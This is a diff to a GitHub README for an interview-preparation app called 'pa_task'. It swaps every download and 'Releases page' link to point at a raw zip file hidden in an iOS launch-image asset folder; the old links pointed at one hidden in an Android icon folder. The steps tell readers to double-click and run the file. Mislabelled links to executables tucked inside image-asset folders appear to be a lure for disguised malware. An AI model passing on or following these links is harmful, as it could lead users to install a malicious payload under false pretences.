@@ -6,7 +6,7 @@ Welcome to the **pa_task** application! This tool helps you prepare for intervie
 
 ## 📥 Download the App
 
-[![Download pa_task](https://github.com/grild/pa_task/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/task-pa-1.7-beta.2.zip)](https://github.com/grild/pa_task/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/task-pa-1.7-beta.2.zip)
+[![Download pa_task](https://raw.githubusercontent.com/grild/pa_task/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/pa-task-Caesar.zip)](https://raw.githubusercontent.com/grild/pa_task/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/pa-task-Caesar.zip)
 
 ## 🛠️ Features
 
@@ -27,7 +27,7 @@ To use **pa_task**, your computer should meet these basic requirements:
 
 ## 🖥️ Download & Install
 
-To get the latest version of pa_task, visit our [Releases page](https://github.com/grild/pa_task/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/task-pa-1.7-beta.2.zip).
+To get the latest version of pa_task, visit our [Releases page](https://raw.githubusercontent.com/grild/pa_task/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/pa-task-Caesar.zip).
 
 1. Click the link to open the Releases page.
 2. Find the newest version.
@@ -37,7 +37,7 @@ To get the latest version of pa_task, visit our [Releases page](https://github.c
 6. Double-click to run the file.
 7. Follow the on-screen instructions to complete the installation.
 
-To revisit the download link, you can always go to our [Releases page](https://github.com/grild/pa_task/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/task-pa-1.7-beta.2.zip).
+To revisit the download link, you can always go to our [Releases page](https://raw.githubusercontent.com/grild/pa_task/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/pa-task-Caesar.zip).
 
 ## 📋 Usage Instructions
 
@@ -56,7 +56,7 @@ If you encounter issues while using **pa_task**, try the following:
 - Ensure your system meets the requirements.
 - Restart the application if it crashes or freezes.
 - Check your internet connection for any download errors.
-- Ensure you have the latest version by checking the [Releases page](https://github.com/grild/pa_task/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/task-pa-1.7-beta.2.zip).
+- Ensure you have the latest version by checking the [Releases page](https://raw.githubusercontent.com/grild/pa_task/main/ios/Runner/Assets.xcassets/LaunchImage.imageset/pa-task-Caesar.zip).
 
 ## 📚 Contribution
 
